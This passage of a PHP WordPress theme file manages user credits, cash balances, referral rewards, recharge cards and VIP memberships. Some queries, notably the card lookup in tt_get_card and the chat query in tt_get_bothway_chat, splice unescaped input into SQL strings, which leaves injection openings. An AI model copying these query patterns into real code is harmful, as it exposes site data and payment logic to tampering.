
    return false;
}

function tt_get_bothway_chat($one_uid, $limit = 20, $offset = 0, $read = MsgReadStatus::UNREAD, $msg_status = 'publish', $count = false)
{
    $user_id = get_current_user_id();

    if (!$user_id) {
        return false;
    }

    if (!in_array($read, array(MsgReadStatus::UNREAD, MsgReadStatus::READ, MsgReadStatus::ALL))) {
        $read = MsgReadStatus::UNREAD;
    }
    if (!in_array($msg_status, array('publish', 'trash', 'all'))) {
        $msg_status = 'publish';
    }

    global $wpdb;
    $table_name = $wpdb->prefix.'tt_messages';
    $concat_id_str = '\''.$one_uid.'_'.$user_id.'\','.'\''.$user_id.'_'.$one_uid.'\'';

    $sql = sprintf("SELECT %s FROM $table_name WHERE CONCAT_WS('_', `user_id`, `sender_id`) IN (%s) AND `msg_type`='chat'%s%s ORDER BY (CASE WHEN `msg_read`='all' THEN 1 ELSE 0 END) DESC, `msg_date` DESC%s", $count ? 'COUNT(*)' : '*', $concat_id_str, $read != MsgReadStatus::ALL ? " AND `msg_read`='$read'" : '', $msg_status != 'all' ? " AND `msg_status`='$msg_status'" : '', $count ? '' : " LIMIT $offset, $limit");
    $results = $count ? $wpdb->get_var($sql) : $wpdb->get_results($sql);

    if ($results) {
        return $results;
    }

    return 0;
}

function tt_retrieve_referral_keyword()
{
    if (isset($_REQUEST['ref'])) {
        $ref = absint($_REQUEST['ref']);
        do_action('tt_ref', $ref);
    }
}

function tt_handle_ref($ref)
{
    //TODO
}
function tt_reset_uc_pre_get_posts( $q ) { //TODO 分页不存在时返回404
    if($uctab = get_query_var('uctab') && $q->is_main_query()) {
        if(in_array($uctab, array('comments', 'stars', 'followers', 'following', 'chat'))) {
            $q->set( 'posts_per_page', 1 );
            $q->set( 'offset', 0 ); //此时paged参数不起作用
        }
    }elseif($manage = get_query_var('manage_child_route') && $q->is_main_query()){
        if(in_array($manage, array('orders', 'users', 'members', 'coupons', 'cards'))) {
            $q->set( 'posts_per_page', 1 );
            $q->set( 'offset', 0 ); //此时paged参数不起作用
        }
    }elseif($me = get_query_var('me_child_route') && $q->is_main_query()){
        if(in_array($me, array('orders', 'users', 'credits', 'messages', 'following', 'followers'))) {
            $q->set( 'posts_per_page', 1 );
            $q->set( 'offset', 0 ); //此时paged参数不起作用
        }
    }
}
add_action( 'pre_get_posts', 'tt_reset_uc_pre_get_posts' );

function tt_get_user_credit($user_id = 0)
{
    $user_id = $user_id ?: get_current_user_id();

    return (int) get_user_meta($user_id, 'tt_credits', true);
}

function tt_get_user_consumed_credit($user_id = 0)
{
    $user_id = $user_id ?: get_current_user_id();

    return (int) get_user_meta($user_id, 'tt_consumed_credits', true);
}

function tt_update_user_credit($user_id = 0, $amount = 0, $msg = '', $admin_handle = false)
{
    $user_id = $user_id ?: get_current_user_id();
    $before_credits = (int) get_user_meta($user_id, 'tt_credits', true);
    // 管理员直接更改用户积分
    if ($admin_handle) {
        $update = update_user_meta($user_id, 'tt_credits', (int) $amount + $before_credits);
        if ($update) {
            if ($amount > 0){
            // 添加积分消息
            $msg = $msg ?: sprintf(__('Administrator add %d credits to you, current credits %d', 'tt'), max(0, (int) $amount), max(0, (int) $amount) + $before_credits);
            }else{
            $msg = $msg ?: sprintf(__('系统管理员给你减少 %d 积分, 当前积分 %d', 'tt'), abs((int) $amount), (int) $amount + $before_credits);
            }
            tt_create_message($user_id, 0, 'System', 'credit', $msg, '', MsgReadStatus::UNREAD, 'publish');
        }

        return (bool) $update;
    }
    // 普通更新
    if ($amount > 0) {
        $update = update_user_meta($user_id, 'tt_credits', $before_credits + $amount); //Meta ID if the key didn't exist; true on successful update; false on failure or if $meta_value is the same as the existing meta value in the database.
        if ($update) {
            // 添加积分消息
            $msg = $msg ?: sprintf(__('Gain %d credits', 'tt'), $amount);
            tt_create_message($user_id, 0, 'System', 'credit', $msg, '', MsgReadStatus::UNREAD, 'publish');
        }
    } elseif ($amount < 0) {
        if ($before_credits + $amount < 0) {
            return false;
        }
        $before_consumed = (int) get_user_meta($user_id, 'tt_consumed_credits', true);
        update_user_meta($user_id, 'tt_consumed_credits', $before_consumed - $amount);
        $update = update_user_meta($user_id, 'tt_credits', $before_credits + $amount);
        if ($update) {
            // 添加积分消息
            $msg = $msg ?: sprintf(__('Spend %d credits', 'tt'), absint($amount));
            tt_create_message($user_id, 0, 'System', 'credit', $msg, '', MsgReadStatus::UNREAD, 'publish');
        }
    }
    delete_transient('tt_cache_daily_vm_MeCreditRecordsVM_user' . $user_id);
    return true;
}

function tt_add_credits_by_order($order_id)
{
    $order = tt_get_order($order_id);
    if (!$order || $order->order_status != OrderStatus::TRADE_SUCCESS) {
        return;
    }

    $user = get_user_by('id', $order->user_id);
    $credit_price = abs(tt_get_option('tt_hundred_credit_price', 1));
  //$buy_credits = intval($order->order_total_price * 100 / $credit_price);
    $buy_credits = $order->order_quantity;
    tt_update_user_credit($order->user_id, $buy_credits, sprintf(__('Buy <strong>%d</strong> Credits, Cost %0.2f YUAN', 'tt'), $buy_credits, $order->order_total_price));

    // 发送邮件
    $blog_name = get_bloginfo('name');
    $subject = sprintf(__('Charge Credits Successfully - %s', 'tt'), $blog_name);
    $args = array(
        'blogName' => $blog_name,
        'creditsNum' => $buy_credits,
        'currentCredits' => tt_get_user_credit($user->ID),
        'adminEmail' => get_option('admin_email'),
    );
    // tt_async_mail('', $user->user_email, $subject, $args, 'charge-credits-success');
    tt_mail('', $user->user_email, $subject, $args, 'charge-credits-success');
}

function tt_credit_pay($amount = 0, $product_subject = '', $rest = false)
{
    $amount = absint($amount);
    $user_id = get_current_user_id();
    if (!$user_id) {
        return $rest ? new WP_Error('unknown_user', __('You must sign in before payment', 'tt'), array('status' => 403)) : false;
    }

    $credits = (int) get_user_meta($user_id, 'tt_credits', true);
    if ($credits < $amount) {
        return $rest ? new WP_Error('insufficient_credits', __('You do not have enough credits to accomplish this payment', 'tt'), array('status' => 403)) : false;
    }

    $msg = $product_subject ? sprintf(__('Cost %d to buy %s', 'tt'), $amount, $product_subject) : '';
    tt_update_user_credit($user_id, $amount * (-1), $msg); //TODO confirm update
    return true;
}

function tt_update_credit_by_user_register($user_id)
{
    if (isset($_COOKIE['tt_ref']) && is_numeric($_COOKIE['tt_ref'])) {
        $ref_from = absint($_COOKIE['tt_ref']);
        //链接推广人与新注册用户(推广人meta)
        if (get_user_meta($ref_from, 'tt_ref_users', true)) {
            $ref_users = get_user_meta($ref_from, 'tt_ref_users', true);
            if (empty($ref_users)) {
                $ref_users = $user_id;
            } else {
                $ref_users .= ','.$user_id;
            }
            update_user_meta($ref_from, 'tt_ref_users', $ref_users);
        } else {
            update_user_meta($ref_from, 'tt_ref_users', $user_id);
        }
        //链接推广人与新注册用户(注册人meta)
        update_user_meta($user_id, 'tt_ref', $ref_from);
        $rec_reg_num = (int) tt_get_option('tt_rec_reg_num', '5');
        $rec_reg = json_decode(get_user_meta($ref_from, 'tt_rec_reg', true));
        $ua = $_SERVER['REMOTE_ADDR'].'&'.$_SERVER['HTTP_USER_AGENT'];
        if (!$rec_reg) {
            $rec_reg = array();
            $new_rec_reg = array($ua);
        } else {
            $new_rec_reg = $rec_reg;
            array_push($new_rec_reg, $ua);
        }
        if ((count($rec_reg) < $rec_reg_num) && !in_array($ua, $rec_reg)) {
            update_user_meta($ref_from, 'tt_rec_reg', json_encode($new_rec_reg));

            $reg_credit = (int) tt_get_option('tt_rec_reg_credit', '30');
            if ($reg_credit) {
                tt_update_user_credit($ref_from, $reg_credit, sprintf(__('获得注册推广（来自%1$s的注册）奖励%2$s积分', 'tt'), get_the_author_meta('display_name', $user_id), $reg_credit));
            }
        }
    }
    $credit = tt_get_option('tt_reg_credit', 50);
    if ($credit) {
        tt_update_user_credit($user_id, $credit, sprintf(__('获得注册奖励%s积分', 'tt'), $credit));
    }
    $member = tt_get_option('tt_reg_member', 0);
    $blog_name = get_bloginfo('name');
    if ($member) {
        tt_add_or_update_member( $user_id, $member);
        tt_create_message($user_id, 0, 'System', 'notification', sprintf( __('欢迎注册%1$s, 恭喜您获得注册送会员资格，会员已充值到账，请查收！', 'tt'), $blog_name ), '', 0, 'publish');
    }
}
add_action('user_register', 'tt_update_credit_by_user_register');

function tt_update_credit_by_referral_view()
{
    if (isset($_COOKIE['tt_ref']) && is_numeric($_COOKIE['tt_ref'])) {
        $ref_from = absint($_COOKIE['tt_ref']);
        $rec_view_num = (int) tt_get_option('tt_rec_view_num', '50');
        $rec_view = json_decode(get_user_meta($ref_from, 'tt_rec_view', true));
        $ua = $_SERVER['REMOTE_ADDR'].'&'.$_SERVER['HTTP_USER_AGENT'];
        if (!$rec_view) {
            $rec_view = array();
            $new_rec_view = array($ua);
        } else {
            $new_rec_view = $rec_view;
            array_push($new_rec_view, $ua);
        }
        //推广人推广访问数量，不受每日有效获得积分推广次数限制，但限制同IP且同终端刷分
        if (!in_array($ua, $rec_view)) {
            $ref_views = (int) get_user_meta($ref_from, 'tt_aff_views', true);
            ++$ref_views;
            update_user_meta($ref_from, 'tt_aff_views', $ref_views);
        }
        //推广奖励，受每日有效获得积分推广次数限制及同IP终端限制刷分
        if ((count($rec_view) < $rec_view_num) && !in_array($ua, $rec_view)) {
            update_user_meta($ref_from, 'tt_rec_view', json_encode($new_rec_view));
            $view_credit = (int) tt_get_option('tt_rec_view_credit', '5');
            if ($view_credit) {
                tt_update_user_credit($ref_from, $view_credit, sprintf(__('获得访问推广奖励%d积分', 'tt'), $view_credit));
            }
        }
    }
}
add_action('tt_ref', 'tt_update_credit_by_referral_view');

function tt_comment_add_credit($comment_id, $comment_object)
{
    $user_id = $comment_object->user_id;
    if ($user_id) {
        $rec_comment_num = (int) tt_get_option('tt_rec_comment_num', 10);
        $rec_comment_credit = (int) tt_get_option('tt_rec_comment_credit', 5);
        $rec_comment = (int) get_user_meta($user_id, 'tt_rec_comment', true);

        if ($rec_comment < $rec_comment_num && $rec_comment_credit) {
            tt_update_user_credit($user_id, $rec_comment_credit, sprintf(__('获得评论回复奖励%d积分', 'tt'), $rec_comment_credit));
            update_user_meta($user_id, 'tt_rec_comment', $rec_comment + 1);
        }
    }
}
add_action('wp_insert_comment', 'tt_comment_add_credit', 99, 2);

function tt_clear_rec_setup_schedule()
{
    if (!wp_next_scheduled('tt_clear_rec_daily_event')) {
        //~ 1193875200 是 2007/11/01 00:00 的时间戳
        wp_schedule_event('1193875200', 'daily', 'tt_clear_rec_daily_event');
    }
}
add_action('wp', 'tt_clear_rec_setup_schedule');

function tt_do_clear_rec_daily()
{
    global $wpdb;
    $wpdb->query(" DELETE FROM $wpdb->usermeta WHERE meta_key='tt_rec_view' OR meta_key='tt_rec_reg' OR meta_key='tt_rec_post' OR meta_key='tt_rec_comment' OR meta_key='tt_resource_dl_users' "); // TODO tt_resource_dl_users
}
add_action('tt_clear_rec_daily_event', 'tt_do_clear_rec_daily');

function tt_credit_column($columns)
{
    $columns['tt_credit'] = __('Credit', 'tt');

    return $columns;
}
add_filter('manage_users_columns', 'tt_credit_column');

function tt_credit_column_callback($value, $column_name, $user_id)
{
    if ('tt_credit' == $column_name) {
        $credit = intval(get_user_meta($user_id, 'tt_credits', true));
        $void = intval(get_user_meta($user_id, 'tt_consumed_credits', true));
        $value = sprintf(__('总积分 %1$d 已消费 %2$d 剩余 %3$d', 'tt'), $credit + $void, $void, $credit);
    }

    return $value;
}
add_action('manage_users_custom_column', 'tt_credit_column_callback', 10, 3);

function tt_credits_rank($limits = 10, $offset = 0)
{
    global $wpdb;
    $limits = (int) $limits;
    $offset = absint($offset);
    $ranks = $wpdb->get_results(" SELECT DISTINCT user_id, meta_value FROM $wpdb->usermeta WHERE meta_key='tt_credits' ORDER BY -meta_value ASC LIMIT $limits OFFSET $offset");

    return $ranks;
}

function tt_create_credit_charge_order($user_id, $amount = 1)
{
    $amount = abs($amount);
    if (!$amount) {
        return false;
    }
    $order_id = tt_generate_order_num();
    $order_time = current_time('mysql');
    $product_id = Product::CREDIT_CHARGE;
    $product_name = Product::CREDIT_CHARGE_NAME;
    $currency = 'cash';
    $hundred_credits_price = intval(tt_get_option('tt_hundred_credit_price', 1));
    $order_price = sprintf('%0.2f', $hundred_credits_price / 100);
    $order_quantity = $amount * 100;
    $order_total_price = sprintf('%0.2f', $hundred_credits_price * $amount);

    global $wpdb;
    $prefix = $wpdb->prefix;
    $orders_table = $prefix.'tt_orders';
    $insert = $wpdb->insert(
        $orders_table,
        array(
            'parent_id' => 0,
            'order_id' => $order_id,
            'product_id' => $product_id,
            'product_name' => $product_name,
            'order_time' => $order_time,
            'order_price' => $order_price,
            'order_currency' => $currency,
            'order_quantity' => $order_quantity,
            'order_total_price' => $order_total_price,
            'user_id' => $user_id,
        ),
        array('%d', '%s', '%d', '%s', '%s', '%f', '%s', '%d', '%f', '%d')
    );
    if ($insert) {
        return array(
            'insert_id' => $wpdb->insert_id,
            'order_id' => $order_id,
            'total_price' => $order_total_price,
        );
    }

    return false;
}

function tt_daily_sign_anchor($user_id = 0)
{
    $user_id = $user_id ?: get_current_user_id();
    if (get_user_meta($user_id, 'tt_daily_sign', true)) {
        date_default_timezone_set('Asia/Shanghai');
        $sign_date_meta = get_user_meta($user_id, 'tt_daily_sign', true);
        $sign_date = date('Y-m-d', strtotime($sign_date_meta));
        $now_date = date('Y-m-d', time());
        if ($sign_date != $now_date) {
            return '<a class="btn btn-info btn-daily-sign" href="javascript:;" title="'.__('Sign to gain credits', 'tt').'">'.__('Daily Sign', 'tt').'</a>';
        } else {
            return '<a class="btn btn-warning btn-daily-sign signed" href="javascript:;" title="'.sprintf(__('Signed on %s', 'tt'), $sign_date_meta).'">'.__('Signed today', 'tt').'</a>';
        }
    } else {
        return '<a class="btn btn-primary btn-daily-sign" href="javascript:;" id="daily_sign" title="'.__('Sign to gain credits', 'tt').'">'.__('Daily Sign', 'tt').'</a>';
    }
}

function tt_daily_sign()
{
    date_default_timezone_set('Asia/Shanghai');
    $user_id = get_current_user_id();
    if (!$user_id) {
        return new WP_Error('user_not_sign_in', __('You must sign in before daily sign', 'tt'), array('status' => 401));
    }
    $date = date('Y-m-d H:i:s', time());
    $sign_date_meta = get_user_meta($user_id, 'tt_daily_sign', true);
    $sign_date = date('Y-m-d', strtotime($sign_date_meta));
    $now_date = date('Y-m-d', time());
    if ($sign_date != $now_date):
        update_user_meta($user_id, 'tt_daily_sign', $date);
    $credits = (int) tt_get_option('tt_daily_sign_credits', 10);
    tt_update_user_credit($user_id, $credits, sprintf(__('Gain %d credits for daily sign', 'tt'), $credits));
    //TODO clear VM cache
    return true; else:
        return new WP_Error('daily_signed', __('You have signed today', 'tt'), array('status' => 200));
    endif;
}

function tt_get_user_cash($user_id = 0)
{
    $user_id = $user_id ?: get_current_user_id();
    // 注意 余额按分为单位存储
    return sprintf('%0.2f', (int) get_user_meta($user_id, 'tt_cash', true) / 100);
}

function tt_get_user_consumed_cash($user_id = 0)
{
    $user_id = $user_id ?: get_current_user_id();

    return sprintf('%0.2f', (int) get_user_meta($user_id, 'tt_consumed_cash', true) / 100);
}

function tt_update_user_cash($user_id = 0, $amount = 0, $msg = '', $admin_handle = false)
{
    $user_id = $user_id ?: get_current_user_id();
    $before_cash = (int) get_user_meta($user_id, 'tt_cash', true);
    // 管理员直接更改用户余额
    if ($admin_handle) {
        $update = update_user_meta($user_id, 'tt_cash', (int) $amount + $before_cash);
        if ($update) {
            // 添加余额变动消息
            if ($amount > 0){
            $msg = $msg ?: sprintf(__('Administrator add %s cash to you, current cash balance %s', 'tt'), sprintf('%0.2f', max(0, (int) $amount) / 100), sprintf('%0.2f', (int) ($amount + $before_cash) / 100));
            }else{
            $msg = $msg ?: sprintf(__('系统管理员给你余额减少 %s 元 , 当前余额 %s 元', 'tt'), sprintf('%0.2f', abs((int) $amount / 100)), sprintf('%0.2f', (int) ($amount + $before_cash) / 100));
            }
            tt_create_message($user_id, 0, 'System', 'cash', $msg, '', MsgReadStatus::UNREAD, 'publish');
        }

        return (bool) $update;
    }
    // 普通更新
    if ($amount > 0) {
        $update = update_user_meta($user_id, 'tt_cash', $before_cash + $amount); //Meta ID if the key didn't exist; true on successful update; false on failure or if $meta_value is the same as the existing meta value in the database.
        if ($update) {
            // 添加余额变动消息
            $msg = $msg ?: sprintf(__('Charge %s cash, current cash balance %s', 'tt'), sprintf('%0.2f', $amount / 100), sprintf('%0.2f', (int) ($amount + $before_cash) / 100));
            tt_create_message($user_id, 0, 'System', 'cash', $msg, '', MsgReadStatus::UNREAD, 'publish');
        }
    } elseif ($amount < 0) {
        if ($before_cash + $amount < 0) {
            return false;
        }
        $before_consumed = (int) get_user_meta($user_id, 'tt_consumed_cash', true);
        update_user_meta($user_id, 'tt_consumed_cash', $before_consumed - $amount);
        $update = update_user_meta($user_id, 'tt_cash', $before_cash + $amount);
        if ($update) {
            // 添加余额变动消息
            $msg = $msg ?: sprintf(__('Spend %s cash, current cash balance %s', 'tt'), sprintf('%0.2f', absint($amount) / 100), sprintf('%0.2f', (int) ($amount + $before_cash) / 100));
            tt_create_message($user_id, 0, 'System', 'cash', $msg, '', MsgReadStatus::UNREAD, 'publish');
        }
    }

    return true;
}

function tt_add_cash_by_card($card_id, $card_pwd)
{
    $card = tt_get_card($card_id, $card_pwd);
    if (!$card) {
        return new WP_Error('card_not_exist', __('Card is not exist', 'tt'), array('status' => 403));
    } elseif ($card->status != 1) {
        return new WP_Error('card_invalid', __('Card is not valid', 'tt'), array('status' => 403));
    }

    tt_mark_card_used($card->id);

    $user = wp_get_current_user();
    $cash = intval($card->denomination);
    $balance = tt_get_user_cash($user->ID);
    $update = tt_update_user_cash($user->ID, $cash, sprintf(__('Charge <strong>%s</strong> Cash by card, current cash balance %s', 'tt'), sprintf('%0.2f', $cash / 100), sprintf('%0.2f', $cash / 100 + $balance)));

    // 发送邮件
    $blog_name = get_bloginfo('name');
    $subject = sprintf(__('Charge Cash Successfully - %s', 'tt'), $blog_name);
    $args = array(
        'blogName' => $blog_name,
        'cashNum' => sprintf('%0.2f', $cash / 100),
        'currentCash' => tt_get_user_cash($user->ID),
        'adminEmail' => get_option('admin_email'),
    );
    // tt_async_mail('', $user->user_email, $subject, $args, 'charge-cash-success');
    tt_mail('', $user->user_email, $subject, $args, 'charge-cash-success');
    if ($update) {
        return $cash; // 充值卡面额(分)
    }

    return $update;
}

function tt_cash_pay($amount = 0.0, $product_subject = '', $rest = false)
{
    $amount = abs($amount);
    $user_id = get_current_user_id();
    if (!$user_id) {
        return $rest ? new WP_Error('unknown_user', __('You must sign in before payment', 'tt'), array('status' => 403)) : false;
    }

    $balance = (float) tt_get_user_cash($user_id);
    if ($amount - $balance >= 0.0001) {
        return $rest ? new WP_Error('insufficient_cash', __('You do not have enough cash to accomplish this payment', 'tt'), array('status' => 403)) : false;
    }

    $msg = $product_subject ? sprintf(__('Cost %0.2f cash to buy %s, current cash balance %s', 'tt'), $amount, $product_subject, $balance - $amount) : '';
    tt_update_user_cash($user_id, (int) ($amount * (-100)), $msg); //TODO confirm update
    return true;
}

function tt_cash_column($columns)
{
    $columns['tt_cash'] = __('Cash Balance', 'tt');

    return $columns;
}
add_filter('manage_users_columns', 'tt_cash_column');

function tt_cash_column_callback($value, $column_name, $user_id)
{
    if ('tt_cash' == $column_name) {
        $cash = intval(get_user_meta($user_id, 'tt_cash', true));
        $void = intval(get_user_meta($user_id, 'tt_consumed_cash', true));
        $value = sprintf(__('总额 %1$s 已消费 %2$s 余额 %3$s', 'tt'), sprintf('%0.2f', $cash + $void), sprintf('%0.2f', $void), sprintf('%0.2f', $cash));
    }

    return $value;
}
add_action('manage_users_custom_column', 'tt_cash_column_callback', 10, 3);

function tt_get_card($card_id, $card_secret)
{
    global $wpdb;
    $prefix = $wpdb->prefix;
    $cards_table = $prefix.'tt_cards';
    $row = $wpdb->get_row(sprintf("SELECT * FROM $cards_table WHERE `card_id`='%s' AND `card_secret`='%s'", $card_id, $card_secret));

    return $row;
}

function tt_mark_card_used($id)
{
    global $wpdb;
    $prefix = $wpdb->prefix;
    $cards_table = $prefix.'tt_cards';
    $update = $wpdb->update(
        $cards_table,
        array(
            'status' => 0,
        ),
        array('id' => $id),
        array('%d'),
        array('%d')
    );

    return $update;
}

function tt_count_cards($in_effect = false)
{
    global $wpdb;
    $prefix = $wpdb->prefix;
    $cards_table = $prefix.'tt_cards';
    if ($in_effect) {
        $sql = sprintf("SELECT COUNT(*) FROM $cards_table WHERE `status`=1");
    } else {
        $sql = "SELECT COUNT(*) FROM $cards_table";
    }
    $count = $wpdb->get_var($sql);

    return $count;
}

function tt_delete_card($id)
{
    global $wpdb;
    $prefix = $wpdb->prefix;
    $cards_table = $prefix.'tt_cards';
    $delete = $wpdb->delete(
        $cards_table,
        array('id' => $id),
        array('%d')
    );

    return (bool) $delete;
}

function tt_gen_cards($quantity, $denomination)
{
    $raw_cards = array();
    $cards = array();
    $place_holders = array();
    $denomination = absint($denomination);
    $create_time = current_time('mysql');
    for ($i = 0; $i < $quantity; ++$i) {
        $card_id = Utils::generateRandomStr(10, 'number');
        $card_secret = Utils::generateRandomStr(16);
        array_push($raw_cards, array(
            'card_id' => $card_id,
            'card_secret' => $card_secret,
        ));
        array_push($cards, $card_id, $card_secret, $denomination, $create_time, 1);
        array_push($place_holders, "('%s', '%s', '%d', '%s', '%d')");
    }

    global $wpdb;
    $prefix = $wpdb->prefix;
    $cards_table = $prefix.'tt_cards';

    $query = "INSERT INTO $cards_table (card_id, card_secret, denomination, create_time, status) VALUES ";
    $query .= implode(', ', $place_holders);
    $result = $wpdb->query($wpdb->prepare("$query ", $cards));

    if (!$result) {
        return false;
    }

    return $raw_cards;
}

function tt_get_cards($limit = 20, $offset = 0, $in_effect = false)
{
    global $wpdb;
    $prefix = $wpdb->prefix;
    $cards_table = $prefix.'tt_cards';
    if ($in_effect) {
        $sql = sprintf("SELECT * FROM $cards_table WHERE `status`=1 ORDER BY id DESC LIMIT %d OFFSET %d", $limit, $offset);
    } else {
        $sql = sprintf("SELECT * FROM $cards_table ORDER BY id DESC LIMIT %d OFFSET %d", $limit, $offset);
    }
    $results = $wpdb->get_results($sql);

    return $results;
}

function tt_get_user_member_orders($user_id = 0, $limit = 20, $offset = 0)
{
    global $wpdb;
    $user_id = $user_id ?: get_current_user_id();
    $prefix = $wpdb->prefix;
    $table = $prefix.'tt_orders';
    $vip_orders = $wpdb->get_results(sprintf('SELECT * FROM %s WHERE `user_id`=%d AND `product_id` IN (-1,-2,-3) ORDER BY `id` DESC LIMIT %d OFFSET %d', $table, $user_id, $limit, $offset));

    return $vip_orders;
}

function tt_count_user_member_orders($user_id)
{
    global $wpdb;
    $user_id = $user_id ?: get_current_user_id();
    $prefix = $wpdb->prefix;
    $table = $prefix.'tt_orders';
    $count = $wpdb->get_var(sprintf('SELECT COUNT(*) FROM %s WHERE `user_id`=%d AND `product_id` IN (-1,-2,-3)', $table, $user_id));

    return (int) $count;
}

function tt_get_member_type_string($code)
{
    switch ($code) {
        case Member::PERMANENT_VIP:
            $type = __('Permanent Membership', 'tt');
            break;
        case Member::ANNUAL_VIP:
            $type = __('Annual Membership', 'tt');
            break;
        case Member::MONTHLY_VIP:
            $type = __('Monthly Membership', 'tt');
            break;
        case Member::EXPIRED_VIP:
            $type = __('Expired Membership', 'tt');
            break;
        default:
            $type = __('None Membership', 'tt');
    }

    return $type;
}

function tt_get_member_status_string($code)
{
    switch ($code) {
        case Member::PERMANENT_VIP:
        case Member::ANNUAL_VIP:
        case Member::MONTHLY_VIP:
            return __('In Effective', 'tt');
            break;
        case Member::EXPIRED_VIP:
            return __('Expired', 'tt');
            break;
        default:
            return __('N/A', 'tt');
    }
}

function tt_get_member($id)
{
    global $wpdb;
    $prefix = $wpdb->prefix;
    $members_table = $prefix.'tt_members';
    $row = $wpdb->get_row(sprintf("SELECT * FROM $members_table WHERE `id`=%d", $id));

    return $row;
}

function tt_get_member_row($user_id)
{
    global $wpdb;
    $prefix = $wpdb->prefix;
    $members_table = $prefix.'tt_members';
    $row = $wpdb->get_row(sprintf("SELECT * FROM $members_table WHERE `user_id`=%d", $user_id));

    return $row;
}

function tt_add_or_update_member($user_id, $vip_type, $start_time = 0, $end_time = 0, $admin_handle = false){
    global $wpdb;
    $prefix = $wpdb->prefix;
    $members_table = $prefix . 'tt_members';

    if(!in_array($vip_type, array(Member::NORMAL_MEMBER, Member::MONTHLY_VIP, Member::ANNUAL_VIP, Member::PERMANENT_VIP))){
        $vip_type = Member::NORMAL_MEMBER;
    }
    $duration = 0;
    switch ($vip_type){
        case Member::PERMANENT_VIP:
            $duration = Member::PERMANENT_VIP_PERIOD;
            break;
        case Member::ANNUAL_VIP:
            $duration = Member::ANNUAL_VIP_PERIOD;
            break;
        case Member::MONTHLY_VIP:
            $duration = Member::MONTHLY_VIP_PERIOD;
            break;
    }

    if(!$start_time) {
        $start_time = (int)current_time('timestamp');
    }elseif(is_string($start_time)){
        $start_time = strtotime($start_time);
    }

    if(is_string($end_time)){
        $end_time = strtotime($end_time);
    }
    $now = time();
    $row = tt_get_member_row($user_id);
    if($row) {
        $prev_end_time = strtotime($row->endTime);
        if($prev_end_time - $now > 100){ //尚未过期
            $start_time = strtotime($row->startTime); //使用之前的开始时间
            $end_time = $end_time ? : strtotime($row->endTime) + $duration;
        }else{ //已过期
            $start_time = $now;
            $end_time = $end_time ? : $now + $duration;
        }
        $update = $wpdb->update(
            $members_table,
            array(
                'user_type' => $vip_type,
                'startTime' => date('Y-m-d H:i:s', $start_time),
                'endTime' => date('Y-m-d H:i:s', $end_time),
                'endTimeStamp' => $end_time
            ),
            array('user_id' => $user_id),
            array('%d', '%s', '%s', '%d'),
            array('%d')
        );
       
        // 清理会员缓存
        delete_transient('tt_cache_daily_vm_MeMembershipVM_user'.$user_id);
        // 发送邮件
        $admin_handle ? tt_promote_vip_email($user_id, $vip_type, date('Y-m-d H:i:s', $start_time), date('Y-m-d H:i:s', $end_time)) : tt_open_vip_email($user_id, $vip_type, date('Y-m-d H:i:s', $start_time), date('Y-m-d H:i:s', $end_time));
        // 站内消息
        tt_create_message($user_id, 0, 'System', 'notification', __('你的会员状态发生了变化', 'tt'), sprintf( __('会员类型: %1$s, 到期时间: %2$s', 'tt'), tt_get_member_type_string($vip_type), date('Y-m-d H:i:s', $end_time) ));
        return $update !== false;
    }
    $start_time = $now;
    $end_time = $end_time ? : $now + $duration;
    $insert = $wpdb->insert(
        $members_table,
        array(
            'user_id' => $user_id,
            'user_type' => $vip_type,
            'startTime' => date('Y-m-d H:i:s', $start_time),
            'endTime' => date('Y-m-d H:i:s', $end_time),
            'endTimeStamp' => $end_time
        ),
        array('%d', '%d', '%s', '%s', '%d')
    );
    if($insert) {
        // 清理会员缓存
        delete_transient('tt_cache_daily_vm_MeMembershipVM_user'.$user_id);
        // 发送邮件
        $admin_handle ? tt_promote_vip_email($user_id, $vip_type, date('Y-m-d H:i:s', $start_time), date('Y-m-d H:i:s', $end_time)) : tt_open_vip_email($user_id, $vip_type, date('Y-m-d H:i:s', $start_time), date('Y-m-d H:i:s', $end_time));
        // 站内消息
        tt_create_message($user_id, 0, 'System', 'notification', __('你的会员状态发生了变化', 'tt'), sprintf( __('会员类型: %1$s, 到期时间: %2$s', 'tt'), tt_get_member_type_string($vip_type), date('Y-m-d H:i:s', $end_time) ));

        return $wpdb->insert_id;
    }
    return false;
}

function tt_delete_member($user_id)
{
    global $wpdb;
    $prefix = $wpdb->prefix;
    $members_table = $prefix.'tt_members';
    $delete = $wpdb->delete(
        $members_table,
        array('user_id' => $user_id),
        array('%d')
    ); //TODO deleted field
    return (bool) $delete;
}

function tt_delete_member_by_id($id)
{
    global $wpdb;
    $prefix = $wpdb->prefix;
    $members_table = $prefix.'tt_members';
    $delete = $wpdb->delete(
        $members_table,
        array('id' => $id),
        array('%d')
    ); //TODO deleted field
    return (bool) $delete;
}

function tt_get_vip_members($member_type = -1, $limit = 20, $offset = 0)
{
    if ($member_type != -1 && !in_array($member_type, array(Member::MONTHLY_VIP, Member::ANNUAL_VIP, Member::PERMANENT_VIP))) {
        $member_type = -1;
    }

    global $wpdb;
    $prefix = $wpdb->prefix;
    $members_table = $prefix.'tt_members';
    $now = time();

    if ($member_type == -1) {
        $sql = sprintf("SELECT * FROM $members_table WHERE `user_type`>0 AND `endTimeStamp`>=%d LIMIT %d OFFSET %d", $now, $limit, $offset);
    } else {
        $sql = sprintf("SELECT * FROM $members_table WHERE `user_type`=%d AND `endTimeStamp`>%d LIMIT %d OFFSET %d", $member_type, $now, $limit, $offset);
    }

    $results = $wpdb->get_results($sql);

    return $results;
}

function tt_count_vip_members($member_type = -1)
{
    if ($member_type != -1 && !in_array($member_type, array(Member::MONTHLY_VIP, Member::ANNUAL_VIP, Member::PERMANENT_VIP))) {
        $member_type = -1;
    }

    global $wpdb;
    $prefix = $wpdb->prefix;
    $members_table = $prefix.'tt_members';
    $now = time();

    if ($member_type == -1) {
        $sql = sprintf("SELECT COUNT(*) FROM $members_table WHERE `user_type`>0 AND `endTimeStamp`>=%d", $now);
    } else {
        $sql = sprintf("SELECT COUNT(*) FROM $members_table WHERE `user_type`=%d AND `endTimeStamp`>%d", $member_type, $now);
    }

    $count = $wpdb->get_var($sql);

    return $count;
}

function tt_get_member_icon($user_id)
{
    $member = new Member($user_id);
    //0代表已过期或非会员 1代表月费会员 2代表年费会员 3代表永久会员
    if ($member->is_permanent_vip()) {
        return '<i class="vipico permanent_member" title="永久会员"></i>';
    } elseif ($member->is_annual_vip()) {
        return '<i class="vipico annual_member" title="年费会员"></i>';
    } elseif ($member->is_monthly_vip()) {
        return '<i class="vipico monthly_member" title="VIP会员"></i>';
    }

    return '<i class="vipico normal_member"></i>';
}

